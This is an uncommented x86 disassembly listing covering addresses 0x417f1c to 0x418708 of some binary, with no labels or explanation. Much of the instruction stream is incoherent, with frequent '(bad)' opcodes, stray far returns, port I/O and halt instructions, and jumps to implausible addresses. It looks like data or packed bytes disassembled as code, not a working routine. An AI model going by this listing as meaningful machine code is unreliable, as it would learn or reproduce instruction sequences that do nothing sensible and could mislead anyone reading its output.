  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
